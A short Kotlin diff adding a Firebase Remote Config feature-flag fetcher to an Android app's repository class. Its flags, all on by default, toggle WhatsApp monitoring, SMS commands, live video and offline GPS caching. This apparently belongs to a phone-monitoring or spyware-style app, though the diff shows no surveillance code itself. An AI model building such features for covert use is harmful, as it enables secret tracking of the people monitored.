@@ -1697,6 +1697,38 @@ object FirebaseRepository {
         ref.limitToLast(100).addValueEventListener(listener)
         return listener
     }
+
+    // --- Firebase Remote Config Feature Flags ---
+    fun fetchRemoteConfig(onConfigFetched: (Map<String, Boolean>) -> Unit = {}) {
+        try {
+            val remoteConfig = com.google.firebase.remoteconfig.FirebaseRemoteConfig.getInstance()
+            val configSettings = com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings.Builder()
+                .setMinimumFetchIntervalInSeconds(3600)
+                .build()
+            remoteConfig.setConfigSettingsAsync(configSettings)
+            remoteConfig.setDefaultsAsync(
+                mapOf(
+                    "enable_whatsapp_monitoring" to true,
+                    "enable_sms_commands" to true,
+                    "enable_live_video" to true,
+                    "enable_offline_gps_cache" to true
+                )
+            )
+            remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
+                val config = mapOf(
+                    "enable_whatsapp_monitoring" to remoteConfig.getBoolean("enable_whatsapp_monitoring"),
+                    "enable_sms_commands" to remoteConfig.getBoolean("enable_sms_commands"),
+                    "enable_live_video" to remoteConfig.getBoolean("enable_live_video"),
+                    "enable_offline_gps_cache" to remoteConfig.getBoolean("enable_offline_gps_cache")
+                )
+                onConfigFetched(config)
+            }
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().recordException(e)
+            onConfigFetched(emptyMap())
+        }
+    }
 }
+
 
 
